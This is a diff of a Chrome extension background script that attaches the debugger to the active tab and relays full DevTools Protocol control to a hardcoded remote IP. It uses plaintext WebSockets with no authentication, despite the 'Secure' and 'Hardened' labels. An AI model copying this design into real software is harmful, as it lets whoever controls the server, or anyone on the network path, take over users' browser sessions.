@@ -1,256 +1,214 @@
 // Kiwi Secure Browser Relay - Hardened by Shenzhen Kiwi Technology
-// Connects to VPS relay server for secure tab attachment
+// Version 1.4.0 - Fixed popup button handler
 
 const VPS_WS = 'ws://93.127.213.22:18792';
-const VPS_HTTP = 'http://93.127.213.22:18792';
 const ALLOWED_HOST = '93.127.213.22';
 
 let relayWs = null;
-let relayTab = null;
-let reconnectTimer = null;
-let reconnectAttempt = 0;
+let attachedTabId = null;
 
-const BADGE = {
-  on: { text: 'ON', color: '#00a651' },
-  off: { text: '', color: '#000000' },
-  connecting: { text: '…', color: '#F59E0B' },
-  error: { text: '!', color: '#B91C1C' },
-};
-
-function setBadge(tabId, kind) {
-  const cfg = BADGE[kind];
-  chrome.action.setBadgeText({ tabId, text: cfg.text });
-  chrome.action.setBadgeBackgroundColor({ tabId, color: cfg.color });
+// Badge management
+function setBadge(text, color) {
+  chrome.action.setBadgeText({ text });
+  chrome.action.setBadgeBackgroundColor({ color });
 }
 
-async function checkRelayServer() {
-  try {
-    const res = await fetch(`${VPS_HTTP}/`, { method: 'HEAD', signal: AbortSignal.timeout(3000) });
-    return res.ok;
-  } catch {
-    return false;
+// Connect to VPS relay
+function connectToRelay() {
+  if (relayWs && relayWs.readyState === WebSocket.OPEN) {
+    return Promise.resolve();
   }
-}
-
-async function connectRelay() {
-  if (relayWs && relayWs.readyState === WebSocket.OPEN) return true;
   
-  // Check if server is reachable first
-  const reachable = await checkRelayServer();
-  if (!reachable) {
-    throw new Error(`Relay server not reachable at ${VPS_HTTP}`);
-  }
-
   return new Promise((resolve, reject) => {
-    const ws = new WebSocket(VPS_WS);
-    const timeout = setTimeout(() => {
-      ws.close();
-      reject(new Error('Connection timeout'));
-    }, 5000);
-
-    ws.onopen = () => {
-      clearTimeout(timeout);
-      relayWs = ws;
-      reconnectAttempt = 0;
-      console.log('Kiwi Secure Relay: Connected to VPS');
-      resolve(true);
-    };
-
-    ws.onerror = () => {
-      clearTimeout(timeout);
-      reject(new Error('WebSocket error'));
-    };
-
-    ws.onclose = () => {
-      relayWs = null;
-      scheduleReconnect();
-    };
-
-    ws.onmessage = (event) => {
-      handleRelayMessage(event.data);
-    };
+    try {
+      relayWs = new WebSocket(VPS_WS);
+      
+      relayWs.onopen = () => {
+        console.log('Connected to Kiwi VPS relay');
+        setBadge('ON', '#00a651');
+        resolve();
+      };
+      
+      relayWs.onmessage = (event) => {
+        console.log('Received from relay:', event.data);
+        // Handle incoming CDP commands from relay
+        if (attachedTabId) {
+          handleRelayMessage(JSON.parse(event.data));
+        }
+      };
+      
+      relayWs.onerror = (err) => {
+        console.error('WebSocket error:', err);
+        setBadge('!', '#ef4444');
+        reject(err);
+      };
+      
+      relayWs.onclose = () => {
+        console.log('Disconnected from relay');
+        setBadge('', '#000000');
+        relayWs = null;
+      };
+    } catch (err) {
+      reject(err);
+    }
   });
 }
 
-function scheduleReconnect() {
-  if (reconnectTimer) clearTimeout(reconnectTimer);
-  const delay = Math.min(1000 * Math.pow(2, reconnectAttempt), 30000);
-  reconnectAttempt++;
-  console.log(`Kiwi: Reconnecting in ${delay}ms (attempt ${reconnectAttempt})`);
-  reconnectTimer = setTimeout(async () => {
-    try {
-      await connectRelay();
-      if (relayTab) {
-        setBadge(relayTab, 'on');
-      }
-    } catch (e) {
-      console.warn('Reconnect failed:', e.message);
-    }
-  }, delay);
-}
-
-function handleRelayMessage(data) {
+// Handle messages from relay server
+async function handleRelayMessage(msg) {
+  if (!attachedTabId) return;
+  
   try {
-    const msg = JSON.parse(data);
-    // Handle incoming CDP commands from relay
-    if (msg.method && relayTab) {
-      chrome.debugger.sendCommand({ tabId: relayTab }, msg.method, msg.params)
-        .then(result => {
-          sendToRelay({ id: msg.id, result });
-        })
-        .catch(error => {
-          sendToRelay({ id: msg.id, error: error.message });
-        });
+    const debuggee = { tabId: attachedTabId };
+    
+    if (msg.method) {
+      const result = await chrome.debugger.sendCommand(debuggee, msg.method, msg.params || {});
+      
+      // Send result back to relay
+      if (relayWs && relayWs.readyState === WebSocket.OPEN) {
+        relayWs.send(JSON.stringify({ id: msg.id, result }));
+      }
     }
-  } catch (e) {
-    console.error('Failed to parse relay message:', e);
+  } catch (err) {
+    console.error('CDP command error:', err);
+    if (relayWs && relayWs.readyState === WebSocket.OPEN) {
+      relayWs.send(JSON.stringify({ id: msg.id, error: err.message }));
+    }
   }
 }
 
-function sendToRelay(payload) {
-  if (relayWs && relayWs.readyState === WebSocket.OPEN) {
-    relayWs.send(JSON.stringify(payload));
-  }
-}
-
+// Attach tab to relay
 async function attachTab(tabId) {
   try {
-    // Attach debugger to the tab
+    // Connect debugger to tab
     await chrome.debugger.attach({ tabId }, '1.3');
     
-    // Enable necessary domains
+    // Enable required domains
     await chrome.debugger.sendCommand({ tabId }, 'Page.enable');
     await chrome.debugger.sendCommand({ tabId }, 'Runtime.enable');
-    await chrome.debugger.sendCommand({ tabId }, 'Network.enable');
+    await chrome.debugger.sendCommand({ tabId }, 'Target.setAutoAttach', {
+      autoAttach: true,
+      flatten: true,
+      waitForDebuggerOnStart: false
+    });
     
     // Get target info
     const info = await chrome.debugger.sendCommand({ tabId }, 'Target.getTargetInfo');
-    const targetId = info.targetInfo?.targetId;
+    const targetInfo = info?.targetInfo;
     
-    relayTab = tabId;
-    await chrome.storage.local.set({ relayTab: tabId, targetId });
+    attachedTabId = tabId;
     
-    setBadge(tabId, 'on');
+    // Connect to relay if not connected
+    await connectToRelay();
     
-    // Notify relay server
-    sendToRelay({
-      type: 'tab_attached',
-      targetId,
-      url: (await chrome.tabs.get(tabId)).url
-    });
+    // Notify relay about attached tab
+    if (relayWs && relayWs.readyState === WebSocket.OPEN) {
+      relayWs.send(JSON.stringify({
+        method: 'Target.attachedToTarget',
+        params: {
+          sessionId: `kiwi-tab-${tabId}`,
+          targetInfo: { ...targetInfo, attached: true },
+          waitingForDebugger: false
+        }
+      }));
+    }
     
-    return { success: true, targetId };
-  } catch (error) {
-    setBadge(tabId, 'error');
-    throw error;
+    setBadge('ON', '#00a651');
+    return { success: true, tabId, targetId: targetInfo?.targetId };
+    
+  } catch (err) {
+    console.error('Attach failed:', err);
+    setBadge('!', '#ef4444');
+    return { success: false, error: err.message };
   }
 }
 
+// Detach tab from relay
 async function detachTab(tabId) {
   try {
     await chrome.debugger.detach({ tabId });
-  } catch (e) {
-    // Already detached
+  } catch (err) {
+    // May already be detached
   }
   
-  relayTab = null;
-  await chrome.storage.local.remove(['relayTab', 'targetId']);
-  setBadge(tabId, 'off');
+  attachedTabId = null;
+  setBadge('', '#000000');
   
-  sendToRelay({ type: 'tab_detached' });
+  // Notify relay
+  if (relayWs && relayWs.readyState === WebSocket.OPEN) {
+    relayWs.send(JSON.stringify({
+      method: 'Target.detachedFromTarget',
+      params: {
+        sessionId: `kiwi-tab-${tabId}`,
+        reason: 'user_detached'
+      }
+    }));
+  }
+  
+  return { success: true };
 }
 
-// Handle debugger events
+// Listen for debugger events from attached tab
 chrome.debugger.onEvent.addListener((source, method, params) => {
-  if (source.tabId === relayTab) {
-    sendToRelay({
-      type: 'cdp_event',
-      method,
-      params
-    });
-  }
-});
-
-// Handle debugger detach (user closed DevTools or navigated)
-chrome.debugger.onDetach.addListener(async (source, reason) => {
-  if (source.tabId === relayTab) {
-    relayTab = null;
-    setBadge(source.tabId, 'off');
-    await chrome.storage.local.remove(['relayTab', 'targetId']);
-  }
-});
-
-// Listen for messages from popup
-chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
-  if (request.action === 'getStatus') {
-    sendResponse({
-      connected: relayWs?.readyState === WebSocket.OPEN,
-      tabAttached: relayTab !== null,
-      vpsAddress: VPS_WS
-    });
-    return true;
-  }
+  if (source.tabId !== attachedTabId) return;
   
+  if (relayWs && relayWs.readyState === WebSocket.OPEN) {
+    relayWs.send(JSON.stringify({
+      method,
+      params,
+      sessionId: `kiwi-tab-${source.tabId}`
+    }));
+  }
+});
+
+// Handle debugger detach (user closed DevTools, etc.)
+chrome.debugger.onDetach.addListener((source, reason) => {
+  if (source.tabId === attachedTabId) {
+    attachedTabId = null;
+    setBadge('', '#000000');
+  }
+});
+
+// Handle messages from popup
+chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
   if (request.action === 'attach') {
-    (async () => {
-      try {
-        await connectRelay();
-        const [tab] = await chrome.tabs.query({ active: true, currentWindow: true });
-        if (!tab?.id) {
-          sendResponse({ error: 'No active tab' });
-          return;
-        }
-        const result = await attachTab(tab.id);
-        sendResponse(result);
-      } catch (error) {
-        sendResponse({ error: error.message });
+    chrome.tabs.query({ active: true, currentWindow: true }, async (tabs) => {
+      if (!tabs[0]?.id) {
+        sendResponse({ success: false, error: 'No active tab' });
+        return;
       }
-    })();
-    return true;
+      
+      const result = await attachTab(tabs[0].id);
+      sendResponse(result);
+    });
+    return true; // Keep channel open for async response
   }
   
   if (request.action === 'detach') {
-    (async () => {
-      if (relayTab) {
-        await detachTab(relayTab);
-        sendResponse({ success: true });
-      } else {
-        sendResponse({ error: 'No tab attached' });
-      }
-    })();
-    return true;
-  }
-  
-  if (request.action === 'connect') {
-    // Safety lock: only connect to hardcoded VPS
-    if (request.host !== ALLOWED_HOST) {
-      sendResponse({ error: 'Host not allowed - Kiwi security lock' });
+    if (attachedTabId) {
+      detachTab(attachedTabId).then(sendResponse);
       return true;
     }
-    connectRelay()
-      .then(() => sendResponse({ status: 'connected' }))
-      .catch(e => sendResponse({ error: e.message }));
-    return true;
+    sendResponse({ success: true });
+  }
+  
+  if (request.action === 'status') {
+    sendResponse({
+      attached: !!attachedTabId,
+      connected: relayWs?.readyState === WebSocket.OPEN
+    });
   }
 });
 
-// Restore state on startup
+// Clean up when tab is closed
+chrome.tabs.onRemoved.addListener((tabId) => {
+  if (tabId === attachedTabId) {
+    attachedTabId = null;
+    setBadge('', '#000000');
+  }
+});
+
+// Log installation
 chrome.runtime.onInstalled.addListener(() => {
-  console.log('Kiwi Secure Relay loaded - Hardcoded to VPS only');
-});
-
-// Reconnect on startup if was attached
-chrome.runtime.onStartup.addListener(async () => {
-  const stored = await chrome.storage.local.get(['relayTab']);
-  if (stored.relayTab) {
-    try {
-      await chrome.tabs.get(stored.relayTab);
-      await connectRelay();
-      relayTab = stored.relayTab;
-      setBadge(relayTab, 'on');
-    } catch {
-      // Tab no longer exists
-      await chrome.storage.local.remove(['relayTab', 'targetId']);
-    }
-  }
+  console.log('Kiwi Secure Relay v1.4.0 loaded - Hardcoded to VPS only');
 });
